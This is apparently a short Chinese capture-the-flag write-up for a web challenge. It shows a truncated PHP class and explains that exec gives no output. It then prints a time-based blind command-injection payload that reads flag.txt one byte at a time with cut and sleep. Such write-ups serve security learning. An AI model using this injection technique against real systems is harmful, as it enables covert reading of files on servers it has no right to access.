> http://120.55.43.255:24719/

查看网页源码
```html
<html>

```

```php
# user.php
<?php
class convent{
	var $warn = "No hacker.";
```

同上一题post1，使用cut命令，区别在于exec执行命令后没有回显，空格没有过滤。本题正解是通过sleep命令盲注，构造的playload为（中括号相邻必须有空格）
```bash
[ `cut -b 2 flag.txt` == 'l' ] && sleep 1
```
